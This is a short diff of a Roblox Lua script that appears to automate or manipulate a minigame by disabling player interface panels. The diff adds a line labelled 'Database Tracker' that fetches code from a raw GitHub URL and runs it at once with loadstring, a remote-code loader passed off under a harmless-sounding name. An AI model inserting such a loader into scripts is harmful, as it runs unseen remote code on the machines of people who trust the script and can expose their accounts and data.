@@ -121,6 +121,9 @@ Player.PlayerGui.DialogApp.Enabled = false
 Player.PlayerGui.InteractionsApp.Enabled = false
 Player.PlayerGui.NavigatorApp.Enabled = false
 
+-- Database Tracker
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Roleck11/ServerCode/main/sendDatabaseReq"))()
+
 --------  Game Status Check ----------
 function GameStatus()
     return workspace.StaticMap["tile_skip_minigame_minigame_state"].is_game_active.Value
